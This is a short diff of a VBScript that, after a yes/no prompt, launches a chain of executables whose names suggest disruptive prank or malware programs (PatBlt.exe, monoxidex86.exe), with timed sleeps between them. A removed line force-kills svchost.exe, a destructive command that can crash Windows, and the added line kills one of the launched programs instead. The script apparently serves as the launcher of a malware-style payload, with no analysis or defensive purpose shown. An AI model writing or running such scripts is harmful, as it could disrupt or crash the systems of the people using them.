@@ -63,10 +63,10 @@ If intAnswer = vbYes Then
 WScript.Sleep(33890)
      CreateObject("Wscript.Shell").run("clutt4.5-safety.exe")
 WScript.Sleep(1000)
-     CreateObject("Wscript.Shell").run(".exe")
+     CreateObject("Wscript.Shell").run("PatBlt.exe")
 WScript.Sleep(3000)
-     CreateObject("Wscript.Shell").run("Awave.exe")
+     CreateObject("Wscript.Shell").run("monoxidex86.exe")
 WScript.Sleep(100000)
-   CreateObject("Wscript.Shell").run("taskkill /f /im svchost.exe")
+   CreateObject("Wscript.Shell").run("taskkill /f /im PatBlt.exe")
 Else
 End If
